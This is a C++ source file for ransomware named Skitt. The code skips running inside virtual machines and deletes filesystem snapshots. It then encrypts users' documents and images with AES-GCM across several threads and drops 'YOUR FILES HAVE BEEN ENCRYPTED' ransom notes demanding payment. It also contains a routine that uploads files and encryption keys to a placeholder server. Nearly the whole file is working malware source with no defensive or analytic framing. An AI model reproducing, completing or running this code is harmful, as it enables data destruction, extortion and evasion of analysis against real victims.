// Skitt.cpp
#include <fstream>
#include <vector>
#include <string>
#include <cstdlib>
#include <filesystem>
#include <regex>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/pem.h>
#include <curl/curl.h>
#include <future>
#include <mutex>
#include <set>
#include <sstream>
#include <iomanip>
#include "vm_detector.h"
#include "snapshot_cleaner.h"

namespace fs = std::filesystem;

constexpr size_t AES_KEY_LENGTH = 32;
constexpr size_t AES_IV_LENGTH = 16;
constexpr size_t AES_TAG_LENGTH = 16;

std::mutex fileMutex;
std::set<std::string> ransomNoteDirs;
std::vector<std::pair<std::string, std::string>> encryptionKeys;

std::string bytesToHex(const unsigned char *bytes, size_t length) {
    std::ostringstream oss;
    for (size_t i = 0; i < length; ++i) {
        oss << std::hex << std::setw(2) << std::setfill('0') << (int)bytes[i];
    }
    return oss.str();
}

bool generateRandomKey(unsigned char *buffer, size_t length) {
    return RAND_bytes(buffer, length) == 1;
}

bool encryptFileAESGCM(const std::string &filePath, const unsigned char *key, const unsigned char *iv) {
    std::ifstream inputFile(filePath, std::ios::binary);
    if (!inputFile) return false;

    std::vector<unsigned char> fileData((std::istreambuf_iterator<char>(inputFile)), std::istreambuf_iterator<char>());
    inputFile.close();

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return false;

    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), nullptr, nullptr, nullptr) <= 0 ||
        EVP_EncryptInit_ex(ctx, nullptr, nullptr, key, iv) <= 0) {
        EVP_CIPHER_CTX_free(ctx);
        return false;
    }

    std::vector<unsigned char> encryptedData(fileData.size() + AES_TAG_LENGTH);
    int len = 0;

    if (EVP_EncryptUpdate(ctx, encryptedData.data(), &len, fileData.data(), fileData.size()) <= 0) {
        EVP_CIPHER_CTX_free(ctx);
        return false;
    }

    int finalLen = 0;
    if (EVP_EncryptFinal_ex(ctx, encryptedData.data() + len, &finalLen) <= 0) {
        EVP_CIPHER_CTX_free(ctx);
        return false;
    }

    unsigned char tag[AES_TAG_LENGTH];
    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, AES_TAG_LENGTH, tag) <= 0) {
        EVP_CIPHER_CTX_free(ctx);
        return false;
    }

    encryptedData.resize(len + finalLen);
    std::string encryptedFilePath = filePath + ".enc";
    std::ofstream outputFile(encryptedFilePath, std::ios::binary);
    if (!outputFile) {
        EVP_CIPHER_CTX_free(ctx);
        return false;
    }

    outputFile.write(reinterpret_cast<const char *>(encryptedData.data()), encryptedData.size());
    outputFile.write(reinterpret_cast<const char *>(tag), AES_TAG_LENGTH);
    outputFile.close();

    EVP_CIPHER_CTX_free(ctx);

    {
        std::lock_guard<std::mutex> lock(fileMutex);
        encryptionKeys.emplace_back(bytesToHex(key, AES_KEY_LENGTH), bytesToHex(iv, AES_IV_LENGTH));
    }

    ransomNoteDirs.insert(fs::path(filePath).parent_path().string());
    return true;
}

bool sendFileAndKeysToServer(const std::string &filePath, const std::string &keyHex, const std::string &ivHex) {
    CURL *curl = curl_easy_init();
    if (!curl) return false;

    curl_mime *mime = curl_mime_init(curl);
    curl_mimepart *part = curl_mime_addpart(mime);

    curl_mime_name(part, "file");
    curl_mime_filedata(part, filePath.c_str());

    part = curl_mime_addpart(mime);
    curl_mime_name(part, "key");
    curl_mime_data(part, keyHex.c_str(), CURL_ZERO_TERMINATED);

    part = curl_mime_addpart(mime);
    curl_mime_name(part, "iv");
    curl_mime_data(part, ivHex.c_str(), CURL_ZERO_TERMINATED);

    curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
    curl_easy_setopt(curl, CURLOPT_URL, "https://you_server_name.com/upload-file");
    curl_easy_setopt(curl, CURLOPT_USE_SSL, CURLUSESSL_ALL);

    CURLcode res = curl_easy_perform(curl);
    bool success = (res == CURLE_OK);

    curl_mime_free(mime);
    curl_easy_cleanup(curl);

    return success;
}

void encryptFilesInThread(const std::vector<std::string> &files, const unsigned char *key, const unsigned char *iv) {
    for (const auto &file : files) {
        encryptFileAESGCM(file, key, iv);
    }
}

void createRansomNote(const std::string &directory) {
    std::string ransomNotePath = directory + "/Skitlock.txt";

    std::ofstream ransomNoteFile(ransomNotePath);
    if (!ransomNoteFile) return;

    ransomNoteFile << "==============================================\n"
                   << "          YOUR FILES HAVE BEEN ENCRYPTED      \n"
                   << "==============================================\n\n"
                   << "Your files have been encrypted using strong AES-128 encryption.\n"
                   << "To recover your files, please follow these steps:\n\n"
                   << "1. Visit our payment page: http://example.com/payment\n"
                   << "2. Use this email for support: support@example.com\n"
                   << "3. After payment, you will receive a decryption key.\n\n"
                   << "WARNING: DO NOT attempt to decrypt files manually.\n"
                   << "You may lose your data permanently!\n"
                   << "==============================================\n";
    ransomNoteFile.close();
}

int main() {
    if (IsRunningInVM()) {
        return 1;
    }

    unsigned char aesKey[AES_KEY_LENGTH];
    unsigned char aesIV[AES_IV_LENGTH];

    if (!generateRandomKey(aesKey, AES_KEY_LENGTH) || !generateRandomKey(aesIV, AES_IV_LENGTH)) {
        return 1;
    }

    const std::string mountPoint = "/"; // Modify this as needed
    if (!cleanSnapshots(mountPoint)) {
        return 1;
    }

    const std::string rootDirectory = fs::current_path().string();
    std::regex filePattern(R"(.*\.(docx|xlsx|pdf|jpg|png)$)");
    std::vector<std::string> filesToEncrypt;

    for (const auto &entry : fs::recursive_directory_iterator(rootDirectory)) {
        if (entry.is_regular_file() && std::regex_match(entry.path().string(), filePattern)) {
            filesToEncrypt.push_back(entry.path().string());
        }
    }

    size_t numThreads = std::thread::hardware_concurrency();
    size_t filesPerThread = filesToEncrypt.size() / numThreads;
    std::vector<std::future<void>> futures;

    for (size_t i = 0; i < numThreads; ++i) {
        size_t start = i * filesPerThread;
        size_t end = (i == numThreads - 1) ? filesToEncrypt.size() : start + filesPerThread;
        futures.emplace_back(std::async(std::launch::async, encryptFilesInThread,
                                        std::vector<std::string>(filesToEncrypt.begin() + start,
                                                                 filesToEncrypt.begin() + end),
                                        aesKey, aesIV));
    }

    for (auto &future : futures) {
        future.get();
    }

    for (const auto &directory : ransomNoteDirs) {
        createRansomNote(directory);
    }
    return 0;
}
